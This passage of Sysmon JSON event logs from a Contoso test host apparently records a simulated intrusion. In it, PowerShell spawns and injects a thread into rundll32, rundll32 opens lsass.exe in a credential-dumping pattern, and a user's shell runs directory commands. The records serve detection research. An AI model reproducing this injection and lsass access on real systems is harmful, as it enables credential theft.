            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10504,
            "process_guid": "{DD483508-F4D4-5F6C-0000-0010CA103102}",
            "record_number": "4099140",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 49257,
            "subtype": "start",
            "time": "2020-09-24T19:34:48.247Z",
            "timestamp": 1600976088247,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D4-5F6C-0000-0010CA103102}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|UNKNOWN(000000000A7F2841)|UNKNOWN(000000000A7F64BB)|UNKNOWN(000000000A7F65D3)|UNKNOWN(000000000A7F672B)|UNKNOWN(000000000A7F8A5E)|UNKNOWN(000000000A7F3456)|UNKNOWN(000000000A7F6F3A)|UNKNOWN(000000000A7F0506)|UNKNOWN(000000000A7F78A8)|UNKNOWN(000000000A8047FE)",
            "event_id": "68d97ffa99300f5175fc422fb9c122af3563fbfd17440b4824357062b8b3789b",
            "event_type": "process",
            "event_utc": "2020-09-24T19:37:41.451Z",
            "exe": "rundll32.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "68d97ffa99300f5175fc422fb9c122af3563fbfd17440b4824357062b8b3789b",
            "image_path": "C:\\windows\\system32\\rundll32.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 6704,
            "process_guid": "{DD483508-F585-5F6C-0000-0010C6A53C02}",
            "record_number": "4099201",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "2296",
            "src_process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "subtype": "access",
            "time": "2020-09-24T19:37:41.463Z",
            "timestamp": 1600976261463,
            "uuid": "{DD483508-F585-5F6C-0000-0010C6A53C02}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\sysnative\\rundll32.exe",
            "event_id": "938876c755b8970a1d0dc33c4e19af8fbb7a1833aecd4a39f8410735e0c18192",
            "event_type": "process",
            "event_utc": "2020-09-24T19:37:41.458Z",
            "exe": "rundll32.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "731A783A36A8E69A6434D19D98B12A09",
                "SHA256": "B1E6A7A3E2597E51836277A32B2BC61AA781C8F681D44DFDDEA618B32E2BF2A6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "938876c755b8970a1d0dc33c4e19af8fbb7a1833aecd4a39f8410735e0c18192",
            "image_path": "C:\\Windows\\System32\\rundll32.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "RUNDLL32.EXE",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "pid": 6704,
            "ppid": 2296,
            "process_guid": "{DD483508-F585-5F6C-0000-0010C6A53C02}",
            "record_number": "4099200",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:37:41.463Z",
            "timestamp": 1600976261463,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F585-5F6C-0000-0010C6A53C02}"
        },
        {
            "action": "create",
            "event_id": "f26c33e7bcff176ca43f22483c15c893c4ed8d33b1915f31697a77cd6dc5f872",
            "event_type": "thread",
            "event_utc": "2020-09-24T19:37:41.577Z",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "f26c33e7bcff176ca43f22483c15c893c4ed8d33b1915f31697a77cd6dc5f872",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "thread",
            "record_number": "4099204",
            "src_image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "2296",
            "src_process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "start_address": "0x0000000000E40000",
            "start_module": "%{[event_data][StartModule]}",
            "start_module_name": "%{[event_data][StartModule]}",
            "subtype": "create",
            "tgt_image": "C:\\Windows\\System32\\rundll32.exe",
            "tgt_pid": "6704",
            "tgt_process_guid": "{DD483508-F585-5F6C-0000-0010C6A53C02}",
            "tgt_tid": "3516",
            "time": "2020-09-24T19:37:41.578Z",
            "timestamp": 1600976261578
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a0574|C:\\windows\\System32\\KERNELBASE.dll+3dd5d|UNKNOWN(0000017C9F12F0F5)",
            "event_id": "2a25d898c84c21fd114c1e22866a38f42d369a9661bd6f36a1caa4258d9d1382",
            "event_type": "process",
            "event_utc": "2020-09-24T19:37:42.093Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1010",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2a25d898c84c21fd114c1e22866a38f42d369a9661bd6f36a1caa4258d9d1382",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4099207",
            "src_exe": "rundll32.exe",
            "src_image_path": "C:\\windows\\system32\\rundll32.exe",
            "src_pid": "6704",
            "src_process_guid": "{DD483508-F585-5F6C-0000-0010C6A53C02}",
            "subtype": "access",
            "time": "2020-09-24T19:37:42.108Z",
            "timestamp": 1600976262108,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "b2d5e485b51479ee37eda08673d723d908d4a8526c7e017c98ab965048055003",
            "event_type": "file",
            "event_utc": "2020-09-24T19:42:02.290Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b2d5e485b51479ee37eda08673d723d908d4a8526c7e017c98ab965048055003",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4099419",
            "subtype": "create",
            "time": "2020-09-24T19:42:02.293Z",
            "timestamp": 1600976522293,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C dir X:",
            "event_id": "344c3156ab5f9f31122d58922a73bb5ad2856f96b488f1bc601dd4c7749ee2fc",
            "event_type": "process",
            "event_utc": "2020-09-24T19:59:08.633Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "344c3156ab5f9f31122d58922a73bb5ad2856f96b488f1bc601dd4c7749ee2fc",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 10144,
            "ppid": 3544,
            "process_guid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}",
            "record_number": "4099934",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T19:59:08.650Z",
            "timestamp": 1600977548650,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "ea2f45c937e0b7404548d33f65476beaed55c635b3038f0fdee43dea3abe8470",
            "event_type": "process",
            "event_utc": "2020-09-24T19:59:08.638Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ea2f45c937e0b7404548d33f65476beaed55c635b3038f0fdee43dea3abe8470",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 10144,
            "process_guid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}",
            "record_number": "4099935",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T19:59:08.650Z",
            "timestamp": 1600977548650,
            "uuid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}"
        },
        {
            "action": "terminate",
            "event_id": "86da86d4327997256b35cf90e44e4856fdb38acfb30adac6876a96a2776e9949",
            "event_type": "process",
            "event_utc": "2020-09-24T19:59:35.776Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "86da86d4327997256b35cf90e44e4856fdb38acfb30adac6876a96a2776e9949",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 10144,
            "process_guid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}",
            "record_number": "4099953",
            "subtype": "terminate",
            "time": "2020-09-24T19:59:35.785Z",
            "timestamp": 1600977575785,
            "uuid": "{DD483508-FA8C-5F6C-0000-0010149D8F02}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C mkdir MS_TRASH",
            "event_id": "bcfe16f9536d4e3ab3ce070346ebff4f46d4fc010bbaf9a5eec1a40198780206",
            "event_type": "process",
            "event_utc": "2020-09-24T20:05:50.791Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "bcfe16f9536d4e3ab3ce070346ebff4f46d4fc010bbaf9a5eec1a40198780206",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 8516,
            "ppid": 3544,
            "process_guid": "{DD483508-FC1E-5F6C-0000-00101356A902}",
            "record_number": "4100207",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:05:50.799Z",
            "timestamp": 1600977950799,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FC1E-5F6C-0000-00101356A902}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "38e17c83da2996371e372c3dd6a60dbabe87bd0d4cb33b17da48f1846ebf0e54",
            "event_type": "process",
            "event_utc": "2020-09-24T20:05:50.786Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "38e17c83da2996371e372c3dd6a60dbabe87bd0d4cb33b17da48f1846ebf0e54",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8516,
            "process_guid": "{DD483508-FC1E-5F6C-0000-00101356A902}",
            "record_number": "4100208",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:05:50.800Z",
            "timestamp": 1600977950800,
            "uuid": "{DD483508-FC1E-5F6C-0000-00101356A902}"
        },
